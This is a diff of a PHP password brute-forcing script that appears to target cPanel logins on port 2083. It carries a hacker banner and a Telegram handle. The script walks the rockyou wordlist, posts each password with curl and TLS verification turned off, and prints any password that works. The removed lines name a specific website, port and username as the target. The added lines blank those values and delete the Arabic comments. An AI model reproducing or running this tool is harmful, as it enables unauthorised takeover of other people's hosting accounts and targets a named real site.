@@ -3,7 +3,7 @@
 set_time_limit(0);
 error_reporting(0);
 
-// --- الواجهة الرسومية (Banner) ---
+// ---  (Banner) ---
 echo "
 \033[1;32m 
   ______                _  _               ___   _ 
@@ -16,11 +16,11 @@ echo "
 echo "\033[1;34m      @telegram: h4mdan01 \033[0m\n";
 echo "--------------------------------------------------\n";
 
-// --- إعدادات الهدف ---
-$host = "www.kairoswatches.com";
-$port = "2083";
-$user = "deuxyc5"; 
-$wordlist = "/root/Desktop/BruteForceFiles/rockyou.txt";
+// ---  ---
+$host = "";
+$port = "";
+$user = ""; 
+$wordlist = "/rockyou.txt";
 
 if (!file_exists($wordlist)) {
     die("\n[!] Error: Wordlist not found at: $wordlist\n");
@@ -33,7 +33,7 @@ echo "[+] Status: Running...\n\n";
 $passwords = file($wordlist, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 
 foreach ($passwords as $password) {
-    // تصحيح الخطأ: هنا تم تغيير $Password إلى $password ليظهر في الشاشة
+  
     echo "[*] Testing: $password ... ";
 
     $ch = curl_init();
@@ -48,12 +48,12 @@ foreach ($passwords as $password) {
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // لتجاوز مشاكل شهادات SSL
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); //
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
 
     $result = curl_exec($ch);
     
-    // فحص الاستجابة (مثال بسيط)
+    // )
     if (strpos($result, '"status":1') !== false) {
         echo "\033[1;32m[ SUCCESS ]\033[0m\n";
         echo "\n[!!!] Password Found: $password\n";
